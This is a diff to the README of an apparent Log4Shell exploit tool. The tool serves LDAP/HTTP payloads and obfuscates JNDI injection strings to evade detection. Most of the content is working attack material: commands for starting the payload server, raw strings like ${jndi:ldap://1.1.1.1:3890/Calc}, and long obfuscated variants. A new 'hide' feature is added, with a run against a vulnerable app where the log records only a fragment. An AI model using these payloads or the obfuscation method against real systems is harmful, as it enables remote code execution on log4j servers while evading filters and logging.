@@ -4,15 +4,15 @@
  * Don't need to install anything except you want to develop this project.
 
 ## Usage
- ### Start LDAP and HTTP server
+ ### Start Log4Shell server
    * ```Log4Shell.exe -host "1.1.1.1"```
    * ```Log4Shell.exe -host "example.com"```
  
- ### Start LDAPS and HTTPS server
+ ### Start Log4Shell server with TLS
    * ```Log4Shell.exe -host "example.com" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"```
    * ```Log4Shell.exe -host "1.1.1.1" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"``` (need IP SANs)
 
- ### Start LDAPS and HTTPS server with ACME
+ ### Start Log4Shell server with ACME
    * ```Log4Shell.exe -host "example.com" -auto-cert``` (must use domain name)
 
  ### Obfuscate malicious(payload) string
@@ -20,23 +20,52 @@
    Log4Shell.exe -obf "${jndi:ldap://1.1.1.1:3890/Calc}"
    ```
    ```
-   raw: ${jndi:ldap://1.1.1.1:3890/Calc_27sHQFpxvwFamvBP}
+   raw: ${jndi:ldap://1.1.1.1:3890/Calc$cz3z]Y_pWxAoLPWh}
 
-   ${j${Wmmra:CaPId:-nd}${Pd:nmPbJde:vWo9b:MUDN6w:-i:l}dap${73xrLJ:ml9s81:-}${J4T2-fyx2:-:}
-   /${PU1W:Ojl2xNxM:LZdr6:Rnb:-/1.}1.${R1Edku:MWjEv3bG:ZKMVOC4d5C:hxjRF:-}${5h2bPs:ItU:-1.}
-   ${ogS5N:nmmhQcYA8-axELsuz03:14:-}${rP:8SL:-}${l31C:0X1Ey:-1}${NANl9M:Pfxb2obs9-PU5bDprOX
-   leb-wHz:-:3}${4MyG:H2h1V2rcTu-P6IDGS4eL:Hk2e:-}${kBUQ:DWF8O:RGSKOognGm:Gcb4g:-890}${kt:R
-   Nj1QL:LJq3xSbQ-QMJ:-/}${mu9nfI-wJul-thdzcWf5G-1eYs:-}C${Cw:CrVaSz-zv:-alc}_2${Pk-1FL1teD
-   6OlWC:yIn6DNeu6-8UUF:-7s}${GDuei:4HWSj:Ra31Mg-PZsPG:-HQF}${myZoY-7Oko:-px}${Tc3hLd-XdMY7
-   :-v}${XaDK4l:oWc:-w}${ZE-TP:-}Fa${2SuF:n465x:-m}${Cdh5xl-hblvwX4Kq:Mj:-v}BP${5V8O-CwErDR
-   2Ji:UjT:-}}
+   ${zrch-Q(NGyN-yLkV:-}${j${sm:Eq9QDZ8-xEv54:-ndi}${GLX-MZK13n78y:GW2pQ:-:l}${ckX:2@BH[)]Tmw:a(:-
+   da}${W(d:KSR)ky3:bv78UX2R-5MV:-p:/}/1.${)U:W9y=N:-}${i9yX1[:Z[Ve2=IkT=Z-96:-1.1}${[W*W:w@q.tjyo
+   @-vL7thi26dIeB-HxjP:-.1}:38${Mh:n341x.Xl2L-8rHEeTW*=-lTNkvo:-90/}${sx3-9GTRv:-Cal}c$c${HR-ewA.m
+   Q:g6@jJ:-z}3z${uY)u:7S2)P4ihH:M_S8fanL@AeX-PrW:-]}${S5D4[:qXhUBruo-QMr$1Bd-.=BmV:-}${_wjS:BIY0s
+   :-Y_}p${SBKv-d9$5:-}Wx${Im:ajtV:-}AoL${=6wx-_HRvJK:-P}W${cR.1-lt3$R6R]x7-LomGH90)gAZ:NmYJx:-}h}
 
    Each string can only be used once, or wait 20 seconds.
    ```
    ```
-   When obfuscate malicious(payload) string, log4j2 package will repeat execute it, the
-   number of repetitions is equal the number of occurrences about string "${". The LDAP
-   server add a simple token mechanism for prevent it. 
+   When obfuscate malicious(payload) string, log4j2 package will repeat execute it, the number
+   of repetitions is equal the number of occurrences about string "${". The LDAP server add a
+   simple token mechanism for prevent it. 
+   ```
+   
+  ### Hide malicious(payload) string
+   ```
+   Log4Shell.exe -obf "${jndi:ldap://127.0.0.1:3890/Calc}" -add-dollar
+   ```
+   ```
+   raw: ${jndi:ldap://127.0.0.1:3890/Calc$YG=.z[.od7rH0XpE}
+   ```
+   ```
+   Execute VulApp:
+   
+   E:\OneDrive\Projects\Golang\GitHub\Log4Shell\vulapp\jar>D:\Java\jdk1.8.0_121\bin\java -jar 
+   vulapp.jar ${j${0395i1-WV[nM-Pv:-nd}i${KoxnAt-KVA6T4:Xggnr:-}:${vlt0_:xTI:-}${kMe=A:QD3FK:
+   -l}d${SaS-TmMt:-a}${uQH-oRFIXtw-4[:-}p:${XL9-bkp9k]-xz:-//}12${D@-rF@wGm:-7.0}.${Fuc:SCV6B
+   m:-}${W1eelS:1jnUDknTJS:*7aHahf2m:vK:-0.1}${ft:4Zbf5Hf1G:Tskg:-:3}${6WH[wc:Fencc:-8}${24Y:
+   5h=5SqK-p(X9:-9}${oYCk6-RDIN5a$Od:U]3iOEVv:7MiEj:-0/C}${NzvB:]6T9$_O9-F.IUl-NnZq:-a}lc$YG=
+   ${*E-5M:-.z[}${N_9@-6(l0sy-b(6.6t-y7NC*:-}${0i-4eS4kB:-.}${5WnL-LKTO554q-x[d:-od7}rH0$${oC
+   :.XYPyzv6-sPH.]*Ls:$@Q:-XpE}}
+   ${j${0395i1-WV[nM-Pv:-nd}i${KoxnAt-KVA6T4:Xggnr:-}:${vlt0_:xTI:-}${kMe=A:QD3FK:-l}d${SaS-T
+   mMt:-a}${uQH-oRFIXtw-4[:-}p:${XL9-bkp9k]-xz:-//}12${D@-rF@wGm:-7.0}.${Fuc:SCV6Bm:-}${W1eel
+   S:1jnUDknTJS:*7aHahf2m:vK:-0.1}${ft:4Zbf5Hf1G:Tskg:-:3}${6WH[wc:Fencc:-8}${24Y:5h=5SqK-p(X
+   9:-9}${oYCk6-RDIN5a$Od:U]3iOEVv:7MiEj:-0/C}${NzvB:]6T9$_O9-F.IUl-NnZq:-a}lc$YG=${*E-5M:-.z
+   [}${N_9@-6(l0sy-b(6.6t-y7NC*:-}${0i-4eS4kB:-.}${5WnL-LKTO554q-x[d:-od7}rH0$${oC:.XYPyzv6-s
+   PH.]*Ls:$@Q:-XpE}}
+   15:49:14.676 [main] ERROR log4j - XpE}
+
+   E:\OneDrive\Projects\Golang\GitHub\Log4Shell\vulapp\jar>
+   ```
+   ```
+   The Logger will only record a part of raw string "15:49:14.676 [main] ERROR log4j - XpE}",
+   and repeat execute will not appear(I don't know why this happened).
    ```
 
 ## Check
@@ -69,6 +98,8 @@
                                                         https://github.com/For-ACGN/Log4Shell
 
 Usage of Log4Shell.exe:
+  -add-dollar
+        add one dollar to the obfuscated string
   -auto-cert
         use ACME client to sign certificate automatically
   -host string
